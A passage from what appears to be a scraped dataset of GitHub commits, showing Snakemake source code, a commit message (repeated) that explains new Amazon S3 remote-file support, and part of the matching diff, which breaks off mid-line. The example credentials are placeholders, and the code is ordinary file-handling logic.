message(self, message):\n        def decorate(ruleinfo):\n            ruleinfo.message = message\n            return ruleinfo\n\n        return decorate\n\n    def benchmark(self, benchmark):\n        def decorate(ruleinfo):\n            ruleinfo.benchmark = benchmark\n            return ruleinfo\n\n        return decorate\n\n    def threads(self, threads):\n        def decorate(ruleinfo):\n            ruleinfo.threads = threads\n            return ruleinfo\n\n        return decorate\n\n    def resources(self, *args, **resources):\n        def decorate(ruleinfo):\n            ruleinfo.resources = (args, resources)\n            return ruleinfo\n\n        return decorate\n\n    def priority(self, priority):\n        def decorate(ruleinfo):\n            ruleinfo.priority = priority\n            return ruleinfo\n\n        return decorate\n\n    def version(self, version):\n        def decorate(ruleinfo):\n            ruleinfo.version = version\n            return ruleinfo\n\n        return decorate\n\n    def log(self, *logs, **kwlogs):\n        def decorate(ruleinfo):\n            ruleinfo.log = (logs, kwlogs)\n            return ruleinfo\n\n        return decorate\n\n    def shellcmd(self, cmd):\n        def decorate(ruleinfo):\n            ruleinfo.shellcmd = cmd\n            return ruleinfo\n\n        return decorate\n\n    def norun(self):\n        def decorate(ruleinfo):\n            ruleinfo.norun = True\n            return ruleinfo\n\n        return decorate\n\n    def run(self, func):\n        return RuleInfo(func)\n\n    @staticmethod\n    def _empty_decorator(f):\n        return f\n\n\nclass RuleInfo:\n    def __init__(self, func):\n        self.func = func\n        self.shellcmd = None\n        self.norun = False\n        self.input = None\n        self.output = None\n        self.params = None\n        self.message = None\n        self.benchmark = None\n        self.threads = None\n        self.resources = None\n        self.priority = None\n        self.version = None\n        self.log = None\n        self.docstring = None\n\n\nclass Subworkflow:\n    def __init__(self, workflow, name, snakefile, workdir):\n        self.workflow = workflow\n        self.name = name\n        self._snakefile = snakefile\n        self._workdir = workdir\n\n    @property\n    def snakefile(self):\n        if self._snakefile is None:\n            return os.path.abspath(os.path.join(self.workdir, \"Snakefile\"))\n        if not os.path.isabs(self._snakefile):\n            return os.path.abspath(os.path.join(self.workflow.basedir,\n                                                self._snakefile))\n        return self._snakefile\n\n    @property\n    def workdir(self):\n        workdir = \".\" if self._workdir is None else self._workdir\n        if not os.path.isabs(workdir):\n            return os.path.abspath(os.path.join(self.workflow.basedir,\n                                                workdir))\n        return workdir\n\n    def target(self, paths):\n        if not_iterable(paths):\n            return flag(os.path.join(self.workdir, paths), \"subworkflow\", self)\n        return [self.target(path) for path in paths]\n\n    def targets(self, dag):\n        return [f for job in dag.jobs for f in job.subworkflow_input\n                if job.subworkflow_input[f] is self]\n\n\nclass Rules:\n    \"\"\" A namespace for rules so that they can be accessed via dot notation. \"\"\"\n    pass\n\n\ndef srcdir(path):\n    \"\"\"Return the absolute path, relative to the source directory of the current Snakefile.\"\"\"\n    if not workflow.included_stack:\n        return None\n    return os.path.join(os.path.dirname(workflow.included_stack[-1]), path)\n"}},"msg":"Initial commit with support for remote files.\n\nThis introduces changes that scratch an itch within our research group for remote file support, and I hope the new functionality will be useful for others as well.\n\nWhat is it all about? Wouldn't it be wonderful if you would use Snakemake with remote data stored on Amazon S3? Imagine being able to read and write the same files as your collaborators without rsyncing files back and forth or using pricey network-attached storage. Want to output and store 1PB of small files? Want to let someone else worry about durability? Want to work with large files locally that you can store individually but that are too large in aggregate? The support for remote storage introduced with these changes will allow you do all of these things! Remote storage is initially intended to work with AWS S3 and things sporting a similar API, though it is flexible enough that would could extended it to support other remote providers. It expect you to already have an S3 bucket setup, and API credentials for it permitting read\/write access.\n\nHere's how you use it:\n\nThe `Snakefile` now supports a wrapper function, `remote()`, indicating a file is on a remote storage provider (this is similar to `temp()` or `protected()`). During rule execution, the file (or object) specified, is downloaded to the `cwd`, within a sub-directory bearing the same name as the bucket. This lets you have multiple remote origins with reduced likelihood of name collisions, and allows snakemake to easily translate remote objects to local file paths. The `remote()` wrapper is mutually-exclusive with the `temp()` and `protected()` wrappers.\n\nThe implementation of all communication with the remote storage provider is specified in a class passed as a keyword argument to the remote wrapper. This class defines methods related to being a RemoteObject(). By default, the S3 provider is used and it does not need to be specified explicitly. If you are interested in creating a custom remote storage provider for whatever system you are using, implement the methods defined in the abstract base class `snakemake.remote_providers.RemoteObjectProvider`. Take a look at the S3 provider for an example implementation. To use a custom remote storage provider implementation (FTP, etc.), import it within your `Snakefile`, and set the `provider` keyword argument, as is being done with S3 below:\n\n    import snakemake.remote_providers.S3 as S3\n\n    rule all:\n        input:\n            remote(\"bucket-name\/file.txt\", provider=S3)\n\nSince S3 is the default remote storage provider, it can be omitted from the `Snakefile`:\n\n    rule all:\n        input:\n            remote(\"bucket-name\/file.txt\")\n\nAdditional kwargs can be passed to the remote provider this way to set credentials, should you not want to rely on whichever credentials happen to be stored in the environment variables (suggestion: if using multiple buckets with different credentials, read in the key and secret within your `Snakefile` and pass as appropriate to the `remote()` wrappers). For the S3 provider, the additional kwargs are passed straight through to the boto `connect_s3()` method, so refer to the [boto docs](https:\/\/boto.readthedocs.org\/en\/latest\/ref\/s3.html#boto.s3.connection.S3Connection) to see the available parameters:\n\n    rule all:\n        input:\n            remote(\"bucket-name\/file.txt\", provider=S3, additional_kwargs={\"aws_access_key_id\":\"myKey\", \"aws_secret_access_key\":\"mySecret\"})\n\nThis can also be used to specify a custom URL to connect to rather than AWS, for a different service offering an S3-like API:\n\n    rule all:\n        input:\n            remote(\"bucket-name\/file.txt\", provider=S3, additional_kwargs={\"host\":\"mystorageapi.example.com\"})\n\nFor any storage backend with an API deviating significantly from that of S3, it may make sense to create a new remote provider.\n\nExpand still works as expected, just wrap the expansion:\n\n    rule all:\n        input:\n            remote(expand(\"bucket-name\/{letter}-2.txt\", letter=[\"A\", \"B\", \"C\"]), provider=S3)\n\nOnly remote files needed to satisfy the DAG build are downloaded for the workflow.  By default, remote files downloaded prior to rule execution and are removed locally as soon as no rules depend on them. Remote files can be explicitly kept by setting the `keep=True` keyword argument:\n\n    rule all:\n        input: remote('bucket-name\/prefix{split_id}.txt', keep=True)\n\nIf you wish to have a rule to simply download a file to a local copy, you can do so by declaring the same file path locally as is used by the remote file:\n\n    rule all:\n        input:\n            remote(\"bucket-name\/out.txt\")\n        output:\n            \"bucket-name\/out.txt\"\n        run:\n            shell(\"cp {output[0]} .\/\")\n\nHere's a brief summary of the changes. I tried to minimize the impact on existing code, relying where possible on external classes, new functions, and the use of decorators to connect them.\n\nWithin `io.py`, the usage of flags has been extended to store not just boolean values, but also objects. This is how, for example, the remote provider is passed to the `_IOFile()` object.\n\nSeveral methods of `_IOFile()` now bear a decorator \"@_referToRemote\". When called, this decorator ensures that for files flagged as `remote()`, the methods defined in the class for the remote provider are used rather than the local equivalents specified within the `_IOFile()` class of `io.py`.\n\nThe `dag.py` file has been updated to have a `handle_remote()` method that is responsible for handling remote files after job execution. It uploads files that are not remote, and removes local files flagged as remote when they are no longer needed (exception: if the `\"keep=True\"` argument is provided to `remote()`).\n\nA `decorators.py` file has been added for general-purpose decorators. Currently in use is `@decAllMethods`, which is a class decorator that applies a specified decorator to all methods of a decorated class. This is used with in the `test_remote\/` unit test to help mock out methods of `RemoteObject()`.\n\nTwo new exceptions have been added, `RemoteFileException()` and `S3FileException()`. These could probably be used more.\n\nThe `jobs.py` file has been changed to add methods related to assessing remote files for a given job. It also has two new functions used in `dag.py` `handle_remote()` to delete remote-containing directories when they are empty after purging local copies of remote files. It also adds `expanded_input()`, which is used in `handle_remote()` to help determine which wildcard\/dynamic files should be removed after job execution. The function `expanded_input()` would benefit from a critical eye.\n\nThe `rules.py` file has a small change causing newly expanded `_IOFile`s to clone the flags of their unexpanded sources. There's probably a better way.\n\nThe `workflow.py` file has been modified to import the new `glob_wildcards_remote()` helper function from `io.py`. This function is the remote analog to `glob_wildcards()`, but it needs to know the remote provider (S3 is default).\n\nA unit test has been added, `test_remote\/`. This is similar in nature to the function `test_cluster_dynamic\/`. For testing, the `moto` package is used to mock out boto, so that remote file tests do not need to hit the live S3 API.\n\nThese changes have the following dependencies (as represented in setup.py):\n* boto>=2.38.0 (for making AWS\/S3 API calls)\n* filechunkio>=1.6 (for file chunking prior to multipart upload, avoiding wheel reinvention)\n* moto>=0.4.14 (for mocking up local S3 \"buckets\" for unit testing)\n\nThis is a first pass at support for remote storage support, and feedback is welcome. The intent was to add remote file support while make minimal changes to existing Snakemake logic."}},"https:\/\/github.com\/vodkatad\/snakemake_docker":{"7ddb8ae8e900d19aa609ca8b97ba5f44b7844e4d":{"url":"https:\/\/api.github.com\/repos\/vodkatad\/snakemake_docker\/commits\/7ddb8ae8e900d19aa609ca8b97ba5f44b7844e4d","html_url":"https:\/\/github.com\/vodkatad\/snakemake_docker\/commit\/7ddb8ae8e900d19aa609ca8b97ba5f44b7844e4d","message":"Initial commit with support for remote files.\n\nThis introduces changes that scratch an itch within our research group for remote file support, and I hope the new functionality will be useful for others as well.\n\nWhat is it all about? Wouldn't it be wonderful if you would use Snakemake with remote data stored on Amazon S3? Imagine being able to read and write the same files as your collaborators without rsyncing files back and forth or using pricey network-attached storage. Want to output and store 1PB of small files? Want to let someone else worry about durability? Want to work with large files locally that you can store individually but that are too large in aggregate? The support for remote storage introduced with these changes will allow you do all of these things! Remote storage is initially intended to work with AWS S3 and things sporting a similar API, though it is flexible enough that would could extended it to support other remote providers. It expect you to already have an S3 bucket setup, and API credentials for it permitting read\/write access.\n\nHere's how you use it:\n\nThe `Snakefile` now supports a wrapper function, `remote()`, indicating a file is on a remote storage provider (this is similar to `temp()` or `protected()`). During rule execution, the file (or object) specified, is downloaded to the `cwd`, within a sub-directory bearing the same name as the bucket. This lets you have multiple remote origins with reduced likelihood of name collisions, and allows snakemake to easily translate remote objects to local file paths. The `remote()` wrapper is mutually-exclusive with the `temp()` and `protected()` wrappers.\n\nThe implementation of all communication with the remote storage provider is specified in a class passed as a keyword argument to the remote wrapper. This class defines methods related to being a RemoteObject(). By default, the S3 provider is used and it does not need to be specified explicitly. If you are interested in creating a custom remote storage provider for whatever system you are using, implement the methods defined in the abstract base class `snakemake.remote_providers.RemoteObjectProvider`. Take a look at the S3 provider for an example implementation. To use a custom remote storage provider implementation (FTP, etc.), import it within your `Snakefile`, and set the `provider` keyword argument, as is being done with S3 below:\n\n    import snakemake.remote_providers.S3 as S3\n\n    rule all:\n        input:\n            remote(\"bucket-name\/file.txt\", provider=S3)\n\nSince S3 is the default remote storage provider, it can be omitted from the `Snakefile`:\n\n    rule all:\n        input:\n            remote(\"bucket-name\/file.txt\")\n\nAdditional kwargs can be passed to the remote provider this way to set credentials, should you not want to rely on whichever credentials happen to be stored in the environment variables (suggestion: if using multiple buckets with different credentials, read in the key and secret within your `Snakefile` and pass as appropriate to the `remote()` wrappers). For the S3 provider, the additional kwargs are passed straight through to the boto `connect_s3()` method, so refer to the [boto docs](https:\/\/boto.readthedocs.org\/en\/latest\/ref\/s3.html#boto.s3.connection.S3Connection) to see the available parameters:\n\n    rule all:\n        input:\n            remote(\"bucket-name\/file.txt\", provider=S3, additional_kwargs={\"aws_access_key_id\":\"myKey\", \"aws_secret_access_key\":\"mySecret\"})\n\nThis can also be used to specify a custom URL to connect to rather than AWS, for a different service offering an S3-like API:\n\n    rule all:\n        input:\n            remote(\"bucket-name\/file.txt\", provider=S3, additional_kwargs={\"host\":\"mystorageapi.example.com\"})\n\nFor any storage backend with an API deviating significantly from that of S3, it may make sense to create a new remote provider.\n\nExpand still works as expected, just wrap the expansion:\n\n    rule all:\n        input:\n            remote(expand(\"bucket-name\/{letter}-2.txt\", letter=[\"A\", \"B\", \"C\"]), provider=S3)\n\nOnly remote files needed to satisfy the DAG build are downloaded for the workflow.  By default, remote files downloaded prior to rule execution and are removed locally as soon as no rules depend on them. Remote files can be explicitly kept by setting the `keep=True` keyword argument:\n\n    rule all:\n        input: remote('bucket-name\/prefix{split_id}.txt', keep=True)\n\nIf you wish to have a rule to simply download a file to a local copy, you can do so by declaring the same file path locally as is used by the remote file:\n\n    rule all:\n        input:\n            remote(\"bucket-name\/out.txt\")\n        output:\n            \"bucket-name\/out.txt\"\n        run:\n            shell(\"cp {output[0]} .\/\")\n\nHere's a brief summary of the changes. I tried to minimize the impact on existing code, relying where possible on external classes, new functions, and the use of decorators to connect them.\n\nWithin `io.py`, the usage of flags has been extended to store not just boolean values, but also objects. This is how, for example, the remote provider is passed to the `_IOFile()` object.\n\nSeveral methods of `_IOFile()` now bear a decorator \"@_referToRemote\". When called, this decorator ensures that for files flagged as `remote()`, the methods defined in the class for the remote provider are used rather than the local equivalents specified within the `_IOFile()` class of `io.py`.\n\nThe `dag.py` file has been updated to have a `handle_remote()` method that is responsible for handling remote files after job execution. It uploads files that are not remote, and removes local files flagged as remote when they are no longer needed (exception: if the `\"keep=True\"` argument is provided to `remote()`).\n\nA `decorators.py` file has been added for general-purpose decorators. Currently in use is `@decAllMethods`, which is a class decorator that applies a specified decorator to all methods of a decorated class. This is used with in the `test_remote\/` unit test to help mock out methods of `RemoteObject()`.\n\nTwo new exceptions have been added, `RemoteFileException()` and `S3FileException()`. These could probably be used more.\n\nThe `jobs.py` file has been changed to add methods related to assessing remote files for a given job. It also has two new functions used in `dag.py` `handle_remote()` to delete remote-containing directories when they are empty after purging local copies of remote files. It also adds `expanded_input()`, which is used in `handle_remote()` to help determine which wildcard\/dynamic files should be removed after job execution. The function `expanded_input()` would benefit from a critical eye.\n\nThe `rules.py` file has a small change causing newly expanded `_IOFile`s to clone the flags of their unexpanded sources. There's probably a better way.\n\nThe `workflow.py` file has been modified to import the new `glob_wildcards_remote()` helper function from `io.py`. This function is the remote analog to `glob_wildcards()`, but it needs to know the remote provider (S3 is default).\n\nA unit test has been added, `test_remote\/`. This is similar in nature to the function `test_cluster_dynamic\/`. For testing, the `moto` package is used to mock out boto, so that remote file tests do not need to hit the live S3 API.\n\nThese changes have the following dependencies (as represented in setup.py):\n* boto>=2.38.0 (for making AWS\/S3 API calls)\n* filechunkio>=1.6 (for file chunking prior to multipart upload, avoiding wheel reinvention)\n* moto>=0.4.14 (for mocking up local S3 \"buckets\" for unit testing)\n\nThis is a first pass at support for remote storage support, and feedback is welcome. The intent was to add remote file support while make minimal changes to existing Snakemake logic.","sha":"7ddb8ae8e900d19aa609ca8b97ba5f44b7844e4d","keyword":"remote code execution protect","diff":"diff --git a\/setup.py b\/setup.py\nindex dfea1ddb..97f4d865 100644\n--- a\/setup.py\n+++ b\/setup.py\n@@ -59,6 +59,7 @@ def run_tests(self):\n     },\n     package_data={'': ['*.css', '*.sh', '*.html']},\n     tests_require=['nose>=1.3'],\n+    install_requires=['boto>=2.38.0','filechunkio>=1.6', 'moto>=0.4.14'],\n     cmdclass={'test': NoseTestCommand},\n     classifiers=\n     [\"Development Status :: 5 - Production\/Stable\", \"Environment :: Console\",\ndiff --git a\/snakemake\/dag.py b\/snakemake\/dag.py\nindex f1ead14e..e5915509 100644\n--- a\/snakemake\/dag.py\n+++ b\/snakemake\/dag.py\n@@ -10,7 +10,7 @@\n from functools import partial, lru_cache\n from operator import itemgetter, attrgetter\n \n-from snakemake.io import IOFile, _IOFile, PeriodicityDetector, wait_for_files\n+from snakemake.io import IOFile, _IOFile, PeriodicityDetector, wait_for_files, is_flagged\n from snakemake.jobs import Job, Reason\n from snakemake.exceptions import RuleException, MissingInputException\n from snakemake.exceptions import MissingRuleException, AmbiguousRuleException\n@@ -288,6 +288,51 @@ def unneeded_files():\n             logger.info(\"Removing temporary output file {}.\".format(f))\n             f.remove()\n \n+    def handle_remote(self, job):\n+        \"\"\" Remove local files if they are no longer needed, and upload to S3. \"\"\"\n+        \n+        needed = lambda job_, f: any(\n+            f in files for j, files in self.depending[job_].items()\n+            if not self.finished(j) and self.needrun(j) and j != job)\n+\n+        remote_files = set([f for f in job.expanded_input if f.is_remote]) | set([f for f in job.expanded_output if f.is_remote])\n+        local_files = set([f for f in job.input if not f.is_remote]) | set([f for f in job.expanded_output if not f.is_remote])\n+        files_to_keep = set(f for f in remote_files if is_flagged(f, \"keep\"))\n+\n+        # remove local files from list of remote files\n+        # in case the same file is specified in both places\n+        remote_files -= local_files\n+        remote_files -= files_to_keep\n+\n+        def unneeded_files():\n+            for job_, files in self.dependencies[job].items():\n+                for f in (remote_files & files):\n+                    if not needed(job_, f) and not f.protected:\n+                        yield f\n+            for f in filterfalse(partial(needed, job), [f for f in remote_files]):\n+                if not f in self.targetfiles and not f.protected:\n+                    yield f\n+\n+        def expanded_dynamic_depending_input_files():\n+            for j in self.depending[job]:    \n+                for f in j.expanded_input:\n+                    yield f\n+\n+        unneededFiles = set(unneeded_files())\n+        unneededFiles -= set(expanded_dynamic_depending_input_files())\n+\n+        for f in [f for f in job.expanded_output if f.is_remote]:\n+            if not f.exists_remote:\n+                logger.info(\"Uploading local output file to remote: {}\".format(f))\n+                f.upload_to_remote()\n+\n+        for f in set(unneededFiles):\n+            logger.info(\"Removing local output file: {}\".format(f))\n+            f.remove()\n+\n+        job.rmdir_empty_remote_dirs()\n+\n+\n     def jobid(self, job):\n         if job not in self._jobid:\n             self._jobid[job] = len(self._jobid)\ndiff --git a\/snakemake\/decorators.py b\/snakemake\/decorators.py\nnew file mode 100644\nindex 00000000..063ddde6\n--- \/dev\/null\n+++ b\/snakemake\/decorators.py\n@@ -0,0 +1,31 @@\n+__author__ = \"Christopher Tomkins-Tinch\"\n+__copyright__ = \"Copyright 2015, Christopher Tomkins-Tinch\"\n+__email__ = \"tomkinsc@broadinstitute.org\"\n+__license__ = \"MIT\"\n+\n+import functools\n+import inspect\n+\n+\n+def memoize(obj):\n+    cache = obj.cache = {}\n+\n+    @functools.wraps(obj)\n+    def memoizer(*args, **kwargs):\n+        key = str(args) + str(kwargs)\n+        if key not in cache:\n+            cache[key] = obj(*args, **kwargs)\n+        return cache[key]\n+\n+    return memoizer\n+\n+\n+def decAllMethods(decorator, prefix='test_'):\n+\n+    def decClass(cls):\n+        for name, m in inspect.getmembers(cls, inspect.isfunction):\n+            if prefix == None or name.startswith(prefix):\n+                setattr(cls, name, decorator(m))\n+        return cls\n+\n+    return decClass\ndiff --git a\/snakemake\/exceptions.py b\/snakemake\/exceptions.py\nindex d606c994..7440442f 100644\n--- a\/snakemake\/exceptions.py\n+++ b\/snakemake\/exceptions.py\n@@ -281,6 +281,13 @@ class IOFileException(RuleException):\n     def __init__(self, msg, lineno=None, snakefile=None):\n         super().__init__(msg, lineno=lineno, snakefile=snakefile)\n \n+class RemoteFileException(RuleException):\n+    def __init__(self, msg, lineno=None, snakefile=None):\n+        super().__init__(msg, lineno=lineno, snakefile=snakefile)\n+\n+class S3FileException(RuleException):\n+    def __init__(self, msg, lineno=None, snakefile=None):\n+        super().__init__(msg, lineno=lineno, snakefile=snakefile)\n \n class ClusterJobException(RuleException):\n     def __init__(self, job, jobid, jobscript):\ndiff --git a\/snakemake\/executors.py b\/snakemake\/executors.py\nindex 6bd01148..961e7ba4 100644\n--- a\/snakemake\/executors.py\n+++ b\/snakemake\/executors.py\n@@ -109,6 +109,7 @@ def print_job_error(self, job):\n     def finish_job(self, job):\n         self.dag.handle_touch(job)\n         self.dag.check_output(job, wait=self.latency_wait)\n+        self.dag.handle_remote(job)\n         self.dag.handle_protected(job)\n         self.dag.handle_temp(job)\n \ndiff --git a\/snakemake\/io.py b\/snakemake\/io.py\nindex 0ba9cbde..3e326286 100644\n--- a\/snakemake\/io.py\n+++ b\/snakemake\/io.py\n@@ -8,11 +8,12 @@\n import stat\n import time\n import json\n+import functools\n from itertools import product, chain\n from collections import Iterable, namedtuple\n-from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError\n+from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError, RemoteFileException, S3FileException\n from snakemake.logging import logger\n-\n+import snakemake.remote_providers.S3 as S3\n \n def lstat(f):\n     return os.stat(f, follow_symlinks=os.stat not in os.supports_follow_symlinks)\n@@ -45,9 +46,46 @@ def __new__(cls, file):\n         obj._file = file\n         obj.rule = None\n         obj._regex = None\n+\n         return obj\n \n+    def __init__(self, file):\n+        self._remote_object = None\n+        if self.is_remote:\n+            additional_args = get_flag_value(self._file, \"additional_remote_args\") if get_flag_value(self._file, \"additional_remote_args\") else []\n+            additional_kwargs = get_flag_value(self._file, \"additional_remote_kwargs\") if get_flag_value(self._file, \"additional_remote_kwargs\") else {}\n+            self._remote_object = get_flag_value(self._file, \"remote_provider\").RemoteObject(self, *additional_args, **additional_kwargs)\n+        pass\n+\n+    def _referToRemote(func):\n+        \"\"\" \n+            A decorator so that if the file is remote and has a version \n+            of the same file-related function, call that version instead. \n+        \"\"\"\n+        @functools.wraps(func)\n+        def wrapper(self, *args, **kwargs):\n+            if self.is_remote:\n+                if self.remote_object:\n+                    if hasattr( self.remote_object, func.__name__):\n+                        return getattr( self.remote_object, func.__name__)(*args, **kwargs)\n+            return func(self, *args, **kwargs)\n+        return wrapper\n+\n     @property\n+    def is_remote(self):\n+        return is_flagged(self._file, \"remote\")\n+    \n+    @property\n+    def remote_object(self):\n+        if not self._remote_object:\n+            if self.is_remote:\n+               additional_kwargs = get_flag_value(self._file, \"additional_remote_kwargs\") if get_flag_value(self._file, \"additional_remote_kwargs\") else {}\n+               self._remote_object = get_flag_value(self._file, \"remote_provider\").RemoteObject(self, **additional_kwargs)\n+        return self._remote_object\n+    \n+\n+    @property\n+    @_referToRemote\n     def file(self):\n         if not self._is_function:\n             return self._file\n@@ -56,32 +94,74 @@ def file(self):\n                              \"may not be used directly.\")\n \n     @property\n+    @_referToRemote\n     def exists(self):\n         return os.path.exists(self.file)\n \n     @property\n-    def protected(self):\n-        return self.exists and not os.access(self.file, os.W_OK)\n+    def exists_local(self):\n+        return os.path.exists(self.file)\n+\n+    @property\n+    def exists_remote(self):\n+        return (self.is_remote and self.remote_object.exists())\n+    \n \n     @property\n+    def protected(self):\n+        return self.exists_local and not os.access(self.file, os.W_OK)\n+    \n+    @property\n+    @_referToRemote\n     def mtime(self):\n+        return lstat(self.file).st_mtime\n+\n+    @property\n+    def flags(self):\n+        return getattr(self._file, \"flags\", {})\n+\n+    @property\n+    def mtime_local(self):\n         # do not follow symlinks for modification time\n         return lstat(self.file).st_mtime\n \n     @property\n+    @_referToRemote\n     def size(self):\n         # follow symlinks but throw error if invalid\n         self.check_broken_symlink()\n         return os.path.getsize(self.file)\n \n+    @property\n+    def size_local(self):\n+        # follow symlinks but throw error if invalid\n+        self.check_broken_symlink()\n+        return os.path.getsize(self.file)\n+\n     def check_broken_symlink(self):\n         \"\"\" Raise WorkflowError if file is a broken symlink. \"\"\"\n-        if not self.exists and lstat(self.file):\n+        if not self.exists_local and lstat(self.file):\n             raise WorkflowError(\"File {} seems to be a broken symlink.\".format(self.file))\n \n     def is_newer(self, time):\n         return self.mtime > time\n \n+    def download_from_remote(self):\n+        logger.info(\"Downloading from remote: {}\".format(self.file))\n+\n+        if self.is_remote and self.remote_object.exists():\n+            self.remote_object.download()\n+        else:\n+            raise RemoteFileException(\"The file to be downloaded does not seem to exist remotely.\")\n+ \n+    def upload_to_remote(self):\n+        logger.info(\"Uploading to remote: {}\".format(self.file))\n+\n+        if self.is_remote and not self.remote_object.exists():\n+            self.remote_object.upload()\n+        else:\n+            raise RemoteFileException(\"The file to be uploaded does not seem to exist remotely.\")\n+\n     def prepare(self):\n         path_until_wildcard = re.split(self.dynamic_fill, self.file)[0]\n         dir = os.path.dirname(path_until_wildcard)\n@@ -108,9 +188,10 @@ def protect(self):\n     def remove(self):\n         remove(self.file)\n \n-    def touch(self):\n+    def touch(self, times=None):\n+        \"\"\" times must be 2-tuple: (atime, mtime) \"\"\"\n         try:\n-            lutime(self.file, None)\n+            lutime(self.file, times)\n         except OSError as e:\n             if e.errno == 2:\n                 raise MissingOutputException(\n@@ -136,11 +217,21 @@ def apply_wildcards(self, wildcards,\n         if self._is_function:\n             f = self._file(Namedlist(fromdict=wildcards))\n \n-        return IOFile(apply_wildcards(f, wildcards,\n+        # this bit ensures flags are transferred over to files after\n+        # wildcards are applied\n+\n+        flagsBeforeWildcardResolution = getattr(f, \"flags\", {})\n+\n+\n+        fileWithWildcardsApplied = IOFile(apply_wildcards(f, wildcards,\n                                       fill_missing=fill_missing,\n                                       fail_dynamic=fail_dynamic,\n                                       dynamic_fill=self.dynamic_fill),\n-                      rule=self.rule)\n+                                      rule=self.rule)\n+\n+        fileWithWildcardsApplied.set_flags(getattr(f, \"flags\", {}))\n+\n+        return fileWithWildcardsApplied\n \n     def get_wildcard_names(self):\n         return get_wildcard_names(self.file)\n@@ -166,6 +257,17 @@ def match(self, target):\n     def format_dynamic(self):\n         return self.replace(self.dynamic_fill, \"{*}\")\n \n+    def clone_flags(self, other):\n+        if isinstance(self._file, str):\n+            self._file = AnnotatedString(self._file)\n+        if isinstance(other._file, AnnotatedString):\n+            self._file.flags = getattr(other._file, \"flags\", {})\n+\n+    def set_flags(self, flags):\n+        if isinstance(self._file, str):\n+            self._file = AnnotatedString(self._file)\n+        self._file.flags = flags\n+\n     def __eq__(self, other):\n         f = other._file if isinstance(other, _IOFile) else other\n         return self._file == f\n@@ -286,9 +388,17 @@ def flag(value, flag_type, flag_value=True):\n \n def is_flagged(value, flag):\n     if isinstance(value, AnnotatedString):\n-        return flag in value.flags\n+        return flag in value.flags and value.flags[flag]\n+    if isinstance(value, _IOFile):\n+        return flag in value.flags and value.flags[flag]\n     return False\n \n+def get_flag_value(value, flag_type):\n+    if isinstance(value, AnnotatedString):\n+        if flag_type in value.flags:\n+            return value.flags[flag_type]\n+        else:\n+            return None\n \n def temp(value):\n     \"\"\"\n@@ -297,6 +407,9 @@ def temp(value):\n     if is_flagged(value, \"protected\"):\n         raise SyntaxError(\n             \"Protected and temporary flags are mutually exclusive.\")\n+    if is_flagged(value, \"remote\"):\n+        raise SyntaxError(\n+            \"Remote and temporary flags are mutually exclusive.\")\n     return flag(value, \"temp\")\n \n \n@@ -310,6 +423,9 @@ def protected(value):\n     if is_flagged(value, \"temp\"):\n         raise SyntaxError(\n             \"Protected and temporary flags are mutually exclusive.\")\n+    if is_flagged(value, \"remote\"):\n+        raise SyntaxError(\n+            \"Remote and protected flags are mutually exclusive.\")\n     return flag(value, \"protected\")\n \n \n@@ -318,7 +434,7 @@ def dynamic(value):\n     A flag for a file that shall be dynamic, i.e. the multiplicity\n     (and wildcard values) will be expanded after a certain\n     rule has been run \"\"\"\n-    annotated = flag(value, \"dynamic\")\n+    annotated = flag(value, \"dynamic\", True)\n     tocheck = [annotated] if not_iterable(annotated) else annotated\n     for file in tocheck:\n         matches = list(_wildcard_regex.finditer(file))\n@@ -334,6 +450,36 @@ def dynamic(value):\n def touch(value):\n     return flag(value, \"touch\")\n \n+def remote(value, provider=S3, keep=False, additional_args=None, additional_kwargs=None):\n+\n+    additional_args = [] if not additional_args else additional_args\n+    additional_kwargs = {} if not additional_kwargs else additional_kwargs\n+\n+    if not provider:\n+        raise RemoteFileException(\"Provider (S3, etc.) must be specified for remote file as kwarg.\")\n+    if is_flagged(value, \"temp\"):\n+        raise SyntaxError(\n+            \"Remote and temporary flags are mutually exclusive.\")\n+    if is_flagged(value, \"protected\"):\n+        raise SyntaxError(\n+            \"Remote and protected flags are mutually exclusive.\")\n+    return flag(\n+                flag(\n+                    flag( \n+                        flag( \n+                            flag(value, \"remote\"), \n+                            \"remote_provider\", \n+                            provider\n+                        ), \n+                        \"additional_remote_kwargs\", \n+                        additional_kwargs\n+                    ),\n+                    \"additional_remote_args\",\n+                    additional_args\n+                ),\n+                \"keep\",\n+                keep\n+            )\n \n def expand(*args, **wildcards):\n     \"\"\"\n@@ -410,6 +556,31 @@ def glob_wildcards(pattern):\n                     getattr(wildcards, name).append(value)\n     return wildcards\n \n+def glob_wildcards_remote(pattern, provider=S3, additional_kwargs=None):\n+    additional_kwargs = additional_kwargs if additional_kwargs else {}\n+    referenceObj = IOFile(remote(pattern, provider=provider, **additional_kwargs))\n+    key_list = [k.name for k in referenceObj._remote_object.list] \n+\n+    pattern = \".\/\"+ referenceObj._remote_object.name\n+    pattern = os.path.normpath(pattern)\n+    first_wildcard = re.search(\"{[^{]\", pattern)\n+    dirname = os.path.dirname(pattern[:first_wildcard.start(\n+    )]) if first_wildcard else os.path.dirname(pattern)\n+    if not dirname:\n+        dirname = \".\"\n+\n+    names = [match.group('name')\n+             for match in _wildcard_regex.finditer(pattern)]\n+    Wildcards = namedtuple(\"Wildcards\", names)\n+    wildcards = Wildcards(*[list() for name in names])\n+\n+    pattern = re.compile(regex(pattern))\n+    for f in key_list:\n+        match = re.match(pattern, f)\n+        if match:\n+            for name, value in match.groupdict().items():\n+                getattr(wildcards, name).append(value)\n+    return wildcards\n \n # TODO rewrite Namedlist!\n class Namedlist(list):\ndiff --git a\/snakemake\/jobs.py b\/snakemake\/jobs.py\nindex fdba8b58..317c7c4c 100644\n--- a\/snakemake\/jobs.py\n+++ b\/snakemake\/jobs.py\n@@ -13,7 +13,7 @@\n from functools import partial\n from operator import attrgetter\n \n-from snakemake.io import IOFile, Wildcards, Resources, _IOFile\n+from snakemake.io import IOFile, Wildcards, Resources, _IOFile, is_flagged, contains_wildcard\n from snakemake.utils import format, listfiles\n from snakemake.exceptions import RuleException, ProtectedOutputException\n from snakemake.exceptions import UnexpectedOutputException\n@@ -131,7 +131,40 @@ def expanded_output(self):\n                 if not expansion:\n                     yield f_\n                 for f, _ in expansion:\n-                    yield IOFile(f, self.rule)\n+                    fileToYield = IOFile(f, self.rule)\n+\n+                    fileToYield.clone_flags(f_)\n+\n+                    yield fileToYield\n+            else:\n+                yield f\n+\n+    @property\n+    def expanded_input(self):\n+        \"\"\" Iterate over input files while dynamic output is expanded. \"\"\"\n+\n+        for f, f_ in zip(self.input, self.rule.input):\n+            if not type(f_).__name__ == \"function\":\n+                if type(f_.file).__name__ not in [\"str\", 